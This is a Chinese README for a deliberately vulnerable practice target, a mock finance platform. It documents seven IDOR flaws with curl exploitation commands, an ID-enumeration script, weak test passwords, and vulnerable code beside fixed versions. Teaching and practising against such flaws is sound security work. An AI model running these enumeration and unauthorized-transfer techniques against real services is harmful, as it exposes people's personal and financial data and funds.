# 云享财富 - 水平越权漏洞演示靶机

## 项目简介

本项目是一个用于安全教育的靶机环境，模拟了一个真实的互联网理财平台。系统中故意设置了多处**水平越权（IDOR - Insecure Direct Object Reference）**漏洞，用于演示此类漏洞的危害和原理。

> **警告**：本系统仅用于安全教育和授权渗透测试，请勿用于非法用途！

## 分支说明（便于 GitHub 合并）

最近一轮新增演示功能（`/api/user/search`、`/echo`、`/api/noise`，以及前端搜索/首页噪声请求）当前在分支：`work`。

如果你在 GitHub 上看不到这些改动，请确认 PR 的来源分支选择的是 `work`。

常用命令：

```bash
git branch
git checkout work
git push origin work
```

## 什么是水平越权漏洞？

水平越权（Horizontal Privilege Escalation）是指在同一权限级别下，用户可以访问或操作其他用户的资源。这通常发生在应用程序仅通过用户提交的资源ID来获取数据，而没有验证该资源是否属于当前登录用户。

### 漏洞示意图

```
正常流程:
用户A 登录 → 请求 /api/profile?user_id=1 → 返回用户A的信息 ✓

漏洞利用:
用户A 登录 → 请求 /api/profile?user_id=2 → 返回用户B的信息 ✗ (越权!)
```

## 快速开始

### 1. 安装依赖

```bash
pip install -r requirements.txt
```

### 2. 初始化数据库

```bash
python init_db.py
```

### 3. 启动应用

```bash
python app.py
```

### 4. 访问系统

打开浏览器访问：http://localhost:5000

## 测试账号

| 用户名 | 密码 | 姓名 |
|--------|------|------|
| zhangsan | 123456 | 张三 |
| lisi | 123456 | 李四 |
| wangwu | 123456 | 王五 |
| zhaoliu | 123456 | 赵六 |
| sunqi | 123456 | 孙七 |

## 漏洞清单

### 漏洞1：查看任意用户个人信息

**漏洞位置**：`/api/profile`

**漏洞描述**：接口接受外部传入的 `user_id` 参数，未验证该ID是否属于当前登录用户。

**利用方式**：
```bash
# 登录后，修改 user_id 参数查看其他用户信息
curl "http://localhost:5000/api/profile?user_id=1"
curl "http://localhost:5000/api/profile?user_id=2"
curl "http://localhost:5000/api/profile?user_id=3"
```

**可获取的敏感信息**：
- 用户真实姓名
- 身份证号码
- 手机号码
- 邮箱地址
- 家庭住址

---

### 漏洞2：修改任意用户个人信息

**漏洞位置**：`PUT /api/profile`

**漏洞描述**：接口接受外部传入的 `user_id` 参数进行更新操作，未验证资源归属。

**利用方式**：
```bash
curl -X PUT "http://localhost:5000/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 2, "phone": "13999999999"}'
```

---

### 漏洞3：查看任意用户账户余额和交易记录

**漏洞位置**：`/api/account/<account_id>`

**漏洞描述**：通过账户ID直接查询数据，未验证账户所属用户。

**利用方式**：
```bash
# 遍历账户ID查看所有用户的账户信息
curl "http://localhost:5000/api/account/1"
curl "http://localhost:5000/api/account/2"
curl "http://localhost:5000/api/account/3"
```

**可获取的敏感信息**：
- 账户余额
- 冻结金额
- 完整交易记录
- 交易对手账号

---

### 漏洞4：查看任意用户银行卡信息

**漏洞位置**：`/api/card/<card_id>`

**漏洞描述**：通过银行卡ID直接查询数据，未验证银行卡所属用户。

**利用方式**：
```bash
curl "http://localhost:5000/api/card/1"
curl "http://localhost:5000/api/card/2"
curl "http://localhost:5000/api/card/3"
```

**可获取的敏感信息**：
- 完整银行卡号
- 持卡人姓名
- 绑定手机号
- 开户银行

---

### 漏洞5：查看任意用户站内消息

**漏洞位置**：`/api/message/<message_id>`

**漏洞描述**：通过消息ID直接查询数据，未验证消息所属用户。

**利用方式**：
```bash
curl "http://localhost:5000/api/message/1"
curl "http://localhost:5000/api/message/2"
curl "http://localhost:5000/api/message/3"
```

**可获取的敏感信息**：
- 交易验证码
- 安全警告信息
- 账户变动通知

---

### 漏洞6：删除任意用户站内消息

**漏洞位置**：`DELETE /api/message/<message_id>`

**漏洞描述**：通过消息ID直接删除消息，未验证消息所属用户。

**利用方式**：
```bash
curl -X DELETE "http://localhost:5000/api/message/1"
```

---

### 漏洞7：非法转账（从他人账户转账）

**漏洞位置**：`POST /api/transfer`

**漏洞描述**：转账接口未验证转出账户是否属于当前登录用户。

**利用方式**：
```bash
# 从其他用户账户转账到自己账户
curl -X POST "http://localhost:5000/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{
    "from_account_id": 3,
    "to_account_no": "YX20240001001",
    "amount": 10000
  }'
```

## 漏洞修复方案

### 错误代码示例

```python
@app.route('/api/profile')
@login_required
def api_get_profile():
    user_id = request.args.get('user_id')
    user = User.query.get(user_id)  # 危险：未验证归属
    return jsonify(user.to_dict())
```

### 正确代码示例

```python
# 方案1：不接受外部参数，只返回当前用户信息
@app.route('/api/profile')
@login_required
def api_get_profile():
    user = current_user  # 安全：只使用当前登录用户
    return jsonify(user.to_dict())

# 方案2：验证资源归属关系
@app.route('/api/account/<int:account_id>')
@login_required
def api_get_account(account_id):
    # 安全：同时验证ID和归属
    account = Account.query.filter_by(
        id=account_id,
        user_id=current_user.id
    ).first()

    if not account:
        return jsonify({'error': '无权访问该资源'}), 403

    return jsonify(account.to_dict())
```

### 安全接口对比

系统中提供了安全版本的API供对比学习：
- `/api/secure/profile` - 安全的个人信息接口
- `/api/secure/account/<id>` - 安全的账户信息接口

## 自动化测试脚本

```python
#!/usr/bin/env python3
"""水平越权漏洞批量检测脚本"""

import requests

BASE_URL = "http://localhost:5000"
SESSION = requests.Session()

# 登录获取会话
def login(username, password):
    resp = SESSION.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    })
    return resp.status_code == 200

# 测试用户信息越权
def test_profile_idor():
    print("[*] 测试用户信息越权漏洞...")
    for user_id in range(1, 6):
        resp = SESSION.get(f"{BASE_URL}/api/profile?user_id={user_id}")
        if resp.status_code == 200:
            data = resp.json()
            print(f"  [!] 获取到用户{user_id}信息: {data['data']['real_name']}")

# 测试账户信息越权
def test_account_idor():
    print("[*] 测试账户信息越权漏洞...")
    for account_id in range(1, 10):
        resp = SESSION.get(f"{BASE_URL}/api/account/{account_id}")
        if resp.status_code == 200:
            data = resp.json()
            print(f"  [!] 账户{account_id}: 余额 ¥{data['data']['balance']}")

if __name__ == "__main__":
    if login("zhangsan", "123456"):
        print("[+] 登录成功\n")
        test_profile_idor()
        print()
        test_account_idor()
```

## 项目结构

```
Target/
├── app.py              # Flask主应用（包含漏洞代码）
├── init_db.py          # 数据库初始化脚本
├── requirements.txt    # Python依赖
├── static/
│   ├── css/
│   │   └── style.css   # 样式文件
│   └── js/
│       └── main.js     # 前端JavaScript
├── templates/
│   ├── base.html       # 基础模板
│   ├── index.html      # 首页
│   ├── login.html      # 登录页
│   ├── register.html   # 注册页
│   ├── dashboard.html  # 仪表盘
│   ├── profile.html    # 个人信息
│   ├── accounts.html   # 账户列表
│   ├── account_detail.html  # 账户详情
│   ├── cards.html      # 银行卡管理
│   └── messages.html   # 消息中心
└── README.md           # 说明文档
```

## 使用场景

1. **安全培训**：向开发人员展示水平越权漏洞的危害
2. **渗透测试练习**：作为CTF或渗透测试的练习靶机
3. **安全意识教育**：向非技术人员展示数据泄露的风险
4. **代码审计学习**：学习如何识别和修复此类漏洞

## 免责声明

本项目仅供安全研究和教育目的使用。使用者应当遵守相关法律法规，对于因使用本项目而产生的任何直接或间接损失，作者不承担任何责任。

## License

MIT License
